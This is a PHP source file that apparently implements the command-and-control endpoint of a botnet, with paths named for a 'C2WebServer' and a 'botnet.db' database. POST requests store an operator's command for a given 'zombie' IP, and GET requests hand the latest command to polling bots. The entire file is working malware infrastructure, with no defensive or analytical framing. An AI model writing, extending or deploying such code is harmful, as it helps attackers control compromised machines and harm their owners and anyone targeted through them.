<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $command = $_POST["command"];
    $zombieIP = $_POST["zombieIP"];
    try {
        $db = new PDO('sqlite:/var/www/html/C2WebServer/botnet.db');
        $stmt = $db->prepare("INSERT INTO commands (command) VALUES (?)");
        $result = $stmt->execute([$command]);
        header("Location: activeService.php?ip=" . urlencode($zombieIP));
        
    } catch (PDOException $e) {
        // Handle the exception
        echo "Error: " . $e->getMessage();
    }
}
if ($_SERVER['REQUEST_METHOD'] == "GET") {
    try {
        $db = new PDO('sqlite:/var/www/html/C2WebServer/botnet.db');
        $stmt = $db->query("SELECT command FROM commands ORDER BY ROWID DESC LIMIT 1");
        $lastCommand = $stmt->fetchColumn();

        // Output the last command
        echo $lastCommand;
    } catch (PDOException $e) {
        // Handle the exception
        echo "Error: " . $e->getMessage();
    }
}
?>
